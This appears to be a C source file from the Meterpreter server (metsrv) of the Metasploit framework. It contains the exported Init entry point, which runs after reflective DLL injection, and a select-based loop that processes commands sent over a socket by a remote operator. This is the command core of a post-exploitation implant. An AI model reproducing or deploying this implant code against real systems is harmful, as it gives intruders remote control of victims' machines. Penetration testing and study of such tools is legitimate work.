#include "metsrv.h"
// include the Reflectiveloader() function
#include "../ReflectiveDLLInjection/ReflectiveLoader.c"

// NOTE: _CRT_SECURE_NO_WARNINGS has been added to Configuration->C/C++->Preprocessor->Preprocessor

#define PREPEND_ERROR "### Error: "
#define PREPEND_INFO  "### Info : "
#define PREPEND_WARN  "### Warn : "

DWORD monitor_loop(Remote *remote);

/*
 * Entry point for the DLL (or not if compiled as an EXE)
 */
DWORD __declspec(dllexport) Init(SOCKET fd)
{
	Remote *remote = NULL;
	DWORD res;

	// if hAppInstance is still == NULL it means that we havent been
	// reflectivly loaded so we must patch in the hAppInstance value
	// for use with loading server extensions later.
	if( hAppInstance == NULL )
		hAppInstance = GetModuleHandle( NULL );

	srand(time(NULL));

	do
	{
		if (!(remote = remote_allocate(fd)))
		{
			SetLastError(ERROR_NOT_ENOUGH_MEMORY);

			break;
		}

		// Do not allow the file descriptor to be inherited by child 
		// processes
		SetHandleInformation(fd, HANDLE_FLAG_INHERIT, 0);

		// Register extension dispatch routines
		register_dispatch_routines();

		// Keep processing commands
		res = monitor_loop(remote);
	
		// Clean up our dispatch routines
		deregister_dispatch_routines();

	} while (0);

	if (remote)
		remote_deallocate(remote);

	return res;
}

/*
 * Monitor for requests and local waitable items in the scheduler
 */
DWORD monitor_loop(Remote *remote)
{
	DWORD hres = ERROR_SUCCESS;
	SOCKET fd = remote_get_fd(remote);
	fd_set fdread;

	/*
	 * Read data locally and remotely
	 */
	while (1)
	{
		struct timeval tv;
		LONG data;

		FD_ZERO(&fdread);
		FD_SET(fd, &fdread);

		tv.tv_sec  = 0;
		tv.tv_usec = 100;

		data = select(fd + 1, &fdread, NULL, NULL, &tv);

		if (data > 0)
		{
			if ((hres = command_process_remote(remote, NULL)) != ERROR_SUCCESS)
				break;
		}
		else if (data < 0)
			break;

		// Process local scheduler items
		scheduler_run(remote, 0);
	}

	return hres;
}
